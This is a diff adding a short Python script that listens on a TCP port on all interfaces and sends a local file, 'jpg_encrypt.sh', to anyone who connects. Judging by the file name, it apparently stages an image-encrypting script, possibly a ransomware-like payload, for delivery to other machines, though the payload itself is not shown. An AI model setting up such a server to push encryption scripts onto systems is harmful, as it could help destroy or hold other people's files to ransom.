@@ -1,0 +1,14 @@
+#!/usr/bin/env python3
+import socket
+import sys
+
+port = int(sys.argv[1])
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind(('0.0.0.0',port))
+server.listen(5)
+while True:
+    with open('./jpg_encrypt.sh','rb') as f:
+        conn, addr = server.accept()
+        print(addr,'connected')
+        conn.send(f.read())
+        conn.close()
